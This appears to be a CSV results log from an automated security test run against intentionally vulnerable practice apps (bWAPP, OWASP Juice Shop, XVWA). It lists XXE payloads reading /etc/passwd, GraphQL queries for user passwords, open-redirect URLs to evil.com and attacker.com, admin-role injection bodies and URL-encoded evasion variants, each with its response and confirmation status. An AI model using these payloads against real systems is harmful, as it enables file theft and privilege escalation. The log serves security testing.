+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,XXE,Basic,3,"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]>",200,XML_PARSER_SIGNAL_UNCONFIRMED,false,xml_parse_or_reflection_text,,62,,2026-10-19T02:43:17.593932+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,XXE,Advanced,1,"<!DOCTYPE data [<!ENTITY file SYSTEM ""file:///etc/passwd"">]>",200,XML_PARSER_SIGNAL_UNCONFIRMED,false,xml_parse_or_reflection_text,,62,,2026-10-19T02:43:17.610037+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,XXE,Advanced,2,"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]>",200,XML_PARSER_SIGNAL_UNCONFIRMED,false,xml_parse_or_reflection_text,,78,,2026-10-19T02:43:17.615742+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,XXE,Advanced,3,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">",200,XML_PARSER_SIGNAL_UNCONFIRMED,false,xml_parse_or_reflection_text,,63,,2026-10-19T02:43:17.625481+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,XXE,Evasion,1,%3C!DOCTYPE%20data%20[%3C!ENTITY%20file%20SYSTEM%20%22file:///etc/passwd%22%3E]%3E,200,XML_PARSER_SIGNAL_UNCONFIRMED,false,xml_parse_or_reflection_text,,78,,2026-10-19T02:43:17.637084+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,XXE,Evasion,2,%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E,200,XML_PARSER_SIGNAL_UNCONFIRMED,false,xml_parse_or_reflection_text,,47,,2026-10-19T02:43:17.641921+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,XXE,Evasion,3,%3C!DOCTYPE%20foo%20[%20%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E%20]%3E,200,XML_PARSER_SIGNAL_UNCONFIRMED,false,xml_parse_or_reflection_text,,63,,2026-10-19T02:43:17.647390+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,GraphQL Injection,Basic,1,"{ users{id,password}}",200,NO_CONFIRMATION_SIGNAL,false,,,563,,2026-10-19T02:43:18.174403+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,GraphQL Injection,Basic,2,"{user(id:""1""){email}}",200,NO_CONFIRMATION_SIGNAL,false,,,218,,2026-10-19T02:43:17.837137+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,GraphQL Injection,Basic,3,{ user(id:1){password}},200,NO_CONFIRMATION_SIGNAL,false,,,218,,2026-10-19T02:43:17.842136+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,GraphQL Injection,Advanced,1,"{user(id:""1""){email}}",200,NO_CONFIRMATION_SIGNAL,false,,,188,,2026-10-19T02:43:17.829199+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,GraphQL Injection,Advanced,2,{user(id:1){password}},200,NO_CONFIRMATION_SIGNAL,false,,,219,,2026-10-19T02:43:17.857442+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,GraphQL Injection,Advanced,3,"{users{id,password}}",200,NO_CONFIRMATION_SIGNAL,false,,,203,,2026-10-19T02:43:17.849544+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,GraphQL Injection,Evasion,1,%7B%20user(id:1)%7Bpassword%7D%7D,200,NO_CONFIRMATION_SIGNAL,false,,,203,,2026-10-19T02:43:17.861767+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,GraphQL Injection,Evasion,2,%7Buser(id:%221%22)%7Bemail%7D%7D,200,NO_CONFIRMATION_SIGNAL,false,,,109,,2026-10-19T02:43:17.937250+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,GraphQL Injection,Evasion,3,"%7B%20users%7Bid,password%7D%7D",200,NO_CONFIRMATION_SIGNAL,false,,,110,,2026-10-19T02:43:17.947777+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,Open Redirect,Basic,1,https://evil.com,406,NO_CONFIRMATION_SIGNAL,false,,,218,,2026-10-19T02:43:18.222094+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,Open Redirect,Basic,2,//evil.com,406,NO_CONFIRMATION_SIGNAL,false,,,32,,2026-10-19T02:43:19.377334+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,Open Redirect,Basic,3,http://attacker.com,406,NO_CONFIRMATION_SIGNAL,false,,,157,,2026-10-19T02:43:19.488891+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,Open Redirect,Advanced,1,//evil.com,406,NO_CONFIRMATION_SIGNAL,false,,,157,,2026-10-19T02:43:19.496576+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,Open Redirect,Advanced,2,https://evil.com,406,NO_CONFIRMATION_SIGNAL,false,,,141,,2026-10-19T02:43:19.496576+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,Open Redirect,Advanced,3,http://attacker.com,406,NO_CONFIRMATION_SIGNAL,false,,,141,,2026-10-19T02:43:19.503678+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,Open Redirect,Evasion,1,//evil.com,406,NO_CONFIRMATION_SIGNAL,false,,,156,,2026-10-19T02:43:19.509117+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,Open Redirect,Evasion,2,http://attacker.com,406,NO_CONFIRMATION_SIGNAL,false,,,156,,2026-10-19T02:43:19.514404+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,Open Redirect,Evasion,3,https://evil.com,406,NO_CONFIRMATION_SIGNAL,false,,,156,,2026-10-19T02:43:19.519779+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Open Redirect,Basic,1,https://evil.com,302,EXTERNAL_REDIRECT_CONFIRMED,true,external_location_not_followed,evil.com,1500,,2026-10-19T02:43:19.334960+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Open Redirect,Basic,2,//evil.com,302,EXTERNAL_REDIRECT_CONFIRMED,true,external_location_not_followed,evil.com,78,,2026-10-19T02:43:17.928817+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Open Redirect,Basic,3,http://attacker.com,302,EXTERNAL_REDIRECT_CONFIRMED,true,external_location_not_followed,attacker.com,78,,2026-10-19T02:43:17.928817+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Open Redirect,Advanced,1,//evil.com,302,EXTERNAL_REDIRECT_CONFIRMED,true,external_location_not_followed,evil.com,78,,2026-10-19T02:43:17.937250+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Open Redirect,Advanced,2,https://evil.com,302,EXTERNAL_REDIRECT_CONFIRMED,true,external_location_not_followed,evil.com,125,,2026-10-19T02:43:18.052585+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Open Redirect,Advanced,3,http://attacker.com,302,EXTERNAL_REDIRECT_CONFIRMED,true,external_location_not_followed,attacker.com,125,,2026-10-19T02:43:18.053111+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Open Redirect,Evasion,1,//evil.com,302,EXTERNAL_REDIRECT_CONFIRMED,true,external_location_not_followed,evil.com,125,,2026-10-19T02:43:18.058557+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Open Redirect,Evasion,2,http://attacker.com,302,EXTERNAL_REDIRECT_CONFIRMED,true,external_location_not_followed,attacker.com,125,,2026-10-19T02:43:18.058557+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,Open Redirect,Evasion,3,https://evil.com,302,EXTERNAL_REDIRECT_CONFIRMED,true,external_location_not_followed,evil.com,109,,2026-10-19T02:43:18.059559+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,API Abuse,Basic,1,"{""role"":""admin""}",200,API_RESPONSE_UNCONFIRMED,false,http_200_without_privilege_or_rate_limit_oracle,,406,,2026-10-19T02:43:19.780595+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,API Abuse,Basic,2,"{""admin"":true}",200,API_RESPONSE_UNCONFIRMED,false,http_200_without_privilege_or_rate_limit_oracle,,109,,2026-10-19T02:43:19.609743+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,API Abuse,Basic,3,"{""access"":""root""}",200,API_RESPONSE_UNCONFIRMED,false,http_200_without_privilege_or_rate_limit_oracle,,125,,2026-10-19T02:43:19.628881+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,API Abuse,Advanced,1,"{""role"":""admin""}",200,API_RESPONSE_UNCONFIRMED,false,http_200_without_privilege_or_rate_limit_oracle,,140,,2026-10-19T02:43:19.639670+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,API Abuse,Advanced,2,"{""admin"":true}",200,API_RESPONSE_UNCONFIRMED,false,http_200_without_privilege_or_rate_limit_oracle,,156,,2026-10-19T02:43:19.649812+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,API Abuse,Advanced,3,"{""access"":""root""}",200,API_RESPONSE_UNCONFIRMED,false,http_200_without_privilege_or_rate_limit_oracle,,157,,2026-10-19T02:43:19.661962+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,API Abuse,Evasion,1,%7B%22role%22:%22admin%22%7D,200,API_RESPONSE_UNCONFIRMED,false,http_200_without_privilege_or_rate_limit_oracle,,157,,2026-10-19T02:43:19.672265+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,API Abuse,Evasion,2,%7B%22admin%22:true%7D,200,API_RESPONSE_UNCONFIRMED,false,http_200_without_privilege_or_rate_limit_oracle,,172,,2026-10-19T02:43:19.681792+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,API Abuse,Evasion,3,%7B%22access%22:%22root%22%7D,200,API_RESPONSE_UNCONFIRMED,false,http_200_without_privilege_or_rate_limit_oracle,,125,,2026-10-19T02:43:19.723918+00:00
